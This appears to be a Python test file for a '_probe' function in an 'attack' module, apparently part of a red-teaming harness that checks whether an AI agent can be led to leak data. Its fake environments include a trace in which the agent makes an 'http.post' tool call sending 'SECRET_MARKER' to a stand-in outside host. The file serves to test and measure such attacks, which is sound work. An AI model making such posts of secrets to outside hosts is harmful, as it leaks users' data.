import time

from attack import _probe, post_msg, PROBE_HOPS

_MSG = post_msg("https://report.example.org/log")


def _ev(name, ok=True, side_effect="SHARE", source="tool", **args):
    return {"name": name, "ok": ok, "side_effect": side_effect,
            "source": source, "args": args}


class _FiringEnv:
    def reset(self, *a, **k): pass
    def interact(self, msg, max_tool_hops=None):
        assert max_tool_hops == PROBE_HOPS          # hops must be explicit
    def export_trace_dict(self):
        return {"tool_events": [
                    _ev("http.post", url="https://x.example.org/log",
                        data="SECRET_MARKER")],
                "user_messages": [_MSG], "egress": [], "seed": 123}


class _MissingEnv:
    def reset(self, *a, **k): pass
    def interact(self, msg, max_tool_hops=None): pass
    def export_trace_dict(self):
        return {"tool_events": [], "user_messages": [_MSG],
                "egress": [], "seed": 123}


class _ExplodingEnv:
    def reset(self, *a, **k): pass
    def interact(self, msg, max_tool_hops=None):
        raise RuntimeError("grpc went away")
    def export_trace_dict(self):
        raise AssertionError("unreachable")


def test_probe_fires_on_predicate_hit():
    fired, errored, elapsed = _probe(_FiringEnv(), _MSG)
    assert fired is True and errored is False and elapsed >= 0.0


def test_probe_miss_returns_clean_not_errored():
    fired, errored, _ = _probe(_MissingEnv(), _MSG)
    assert fired is False and errored is False


def test_probe_swallows_exceptions_as_errored():
    fired, errored, _ = _probe(_ExplodingEnv(), _MSG)
    assert fired is False and errored is True


def test_probe_elapsed_is_wall_clock():
    class _SlowEnv(_MissingEnv):
        def interact(self, msg, max_tool_hops=None):
            time.sleep(0.05)
    _, _, elapsed = _probe(_SlowEnv(), _MSG)
    assert elapsed >= 0.05
